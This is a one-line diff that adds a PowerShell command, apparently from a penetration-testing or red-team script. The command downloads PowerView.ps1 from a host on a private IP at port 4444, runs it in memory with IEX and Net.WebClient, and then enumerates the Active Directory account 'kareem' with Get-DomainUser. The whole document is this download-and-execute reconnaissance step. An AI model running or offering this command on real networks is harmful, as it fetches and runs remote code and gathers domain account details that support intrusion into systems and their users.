@@ -1,0 +1,1 @@
+echo "++++++++++++++++   ++`r`n`t`r`n===============UserINFO===============";IEX(New-Object Net.WebClient).DownloadString("http://192.168.116.129:4444/PowerView.ps1");Get-DomainUser -Identity kareem ;echo "++++++++++++++++++`r`n"
